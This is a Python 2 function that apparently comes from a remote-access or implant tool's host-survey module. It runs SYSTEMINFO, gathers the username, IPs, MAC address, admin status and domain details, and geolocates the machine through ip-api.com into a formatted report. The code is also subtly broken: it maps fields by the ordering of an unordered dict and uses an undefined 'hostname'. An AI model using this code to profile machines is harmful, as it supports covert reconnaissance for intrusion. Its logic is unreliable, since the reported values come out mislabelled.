
def grab_all_data(plat_type):

	try:

		values  = {}
		cache   = os.popen2("SYSTEMINFO")
		source  = cache[1].read()

		fields = [
					"Host Name", "OS Name", "OS Version",
					"Product ID", "System Manufacturer",
					"System Model", "System type", "BIOS Version",
					"Domain", "Processor", "Windows Directory", "Total Physical Memory",
					"Available Physical Memory", "Logon Server"
				  ]

		for field in fields:
			if field == "Processor":
				values[field] = re.findall("Processor\(s\):\s+(.+\n\s+.+)", source, re.IGNORECASE)[0]
			else:
				values[field] = [item.strip() for item in re.findall("%s:\w*(.*?)\n" % (field), source, re.IGNORECASE)][0]

		for index, (_, value) in enumerate(values.items(), 1):

			if index == 1: ap_memory             = str(value)
			if index == 2: product_id            = str(value)
			if index == 3: os_name               = str(value)
			if index == 4: bios_version          = str(value)
			if index == 5: system_model          = str(value)
			if index == 6: system_type           = str(value)
			if index == 7: processor             = str(value)
			if index == 8: tp_memory             = str(value)
			if index == 9: logon_server          = str(value)
			if index == 10: domain               = str(value)
			if index == 11: windows_directory    = str(value)
			if index == 12: os_version           = str(value)
			if index == 13: system_manufacturer  = str(value)
			if index == 14: host_name            = str(value)


		username      = getuser()
		fqdn          = socket.getfqdn()
		internal_ip   = socket.gethostbyname(hostname)
		raw_mac       = getnode()
		mac           = ':'.join(("%012X" % raw_mac)[i:i+2] for i in range(0, 12, 2))
		ex_ip_grab    = ['ipinfo.io/ip', 'icanhazip.com', 'ident.me', 'ipecho.net/plain', 'myexternalip.com/raw']
		external_ip   = ''


		for url in ex_ip_grab:

			try:
				external_ip = urllib.urlopen('http://' + url).read().rstrip()
			except IOError:
				pass

			if external_ip and (6 < len(external_ip) < 16): break

		is_admin = False

		if plat_type.startswith('win'):
			is_admin = windll.shell32.IsUserAnAdmin() != 0

		admin_access = 'Yes' if is_admin else 'No'

		url           = 'http://ip-api.com/json/'
		response      = urllib2.urlopen(url)
		data          = load(response)
		_as           = data['as']
		city          = data['city']
		country       = data['country']
		country_code  = data['countryCode']
		isp           = data['isp']
		lat           = data['lat']
		lon           = data['lon']
		org           = data['org']
		region        = data['region']
		region_name   = data['regionName']
		_zip          = data['zip']
		timezone      = data['timezone']
		if _zip == "": _zip = "-"


		survey_results = '''  As                        : {}
  City                      : {}
  Country                   : {}
  Country Code              : {}
  ISP                       : {}
  Lat                       : {}
  Lon                       : {}
  Org                       : {}
  Region                    : {}
  Region Name               : {}
  Zip                       : {}
  Timezone                  : {}
  FQDN                      : {}
  Internal IP               : {}
  External IP               : {}
  MAC Address               : {}
  Current User              : {}
  Admin Access              : {}
  Host Name                 : {}
  OS Name                   : {}
  OS Version                : {}
  Product ID                : {}
  System Manufacturer       : {}
  System Model              : {}
  System type               : {}
  BIOS Version              : {}
  Domain                    : {}
  Logon Server              : {}
  Windows Directory         : {}
  Total Physical Memory     : {}
  Available Physical Memory : {}
  Processor                 : {}
	'''.format(
			_as, city, country, country_code, isp, lat, lon, org, region, region_name, _zip, timezone,
			fqdn, internal_ip, external_ip, mac, username, admin_access, host_name, os_name,
			os_version, product_id, system_manufacturer, system_model, system_type, bios_version, domain,
			logon_server, windows_directory, tp_memory, ap_memory, processor
		)

		return survey_results

	except Exception as e: return e
